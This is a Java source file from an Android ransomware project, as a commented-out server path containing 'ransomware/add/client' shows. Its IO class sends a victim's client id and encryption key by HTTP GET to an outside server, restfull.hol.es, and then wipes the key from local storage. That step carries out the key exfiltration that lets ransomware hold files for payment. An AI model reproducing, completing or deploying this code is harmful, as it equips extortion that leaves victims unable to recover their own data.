package alepacheco.com.rw.io;

import android.content.Context;
import android.util.Log;

import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;

import alepacheco.com.rw.persistence.LocalStorage;

/**
 * Created by joao on 28/06/2017.
 */

public class IO {

    public static String SERVER = "http://restfull.hol.es/tests/test3.php?id=%s&data=%s";//"http://restfull.hol.es/ransomware/add/client/%s/%s";

    public static void sendKeyToServer(final Context ctx, String id, String key){
        String url = String.format(SERVER,id,key);
        RequestQueue queue = Volley.newRequestQueue(ctx);
        StringRequest stringRequest = new StringRequest(Request.Method.GET, url,
                new Response.Listener<String>() {
                    @Override
                    public void onResponse(String response) {
                        Log.v("Debug","ENVIADO");
                        LocalStorage.getInstance(ctx).setSendendToServer();
                        LocalStorage.getInstance(ctx).setByTag(LocalStorage.TAG_KEY,LocalStorage.NULL_VALUE);
                    }
                }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {
                Log.v("Debug","DEU ERRO");
            }
        });
        queue.add(stringRequest);
    }
}
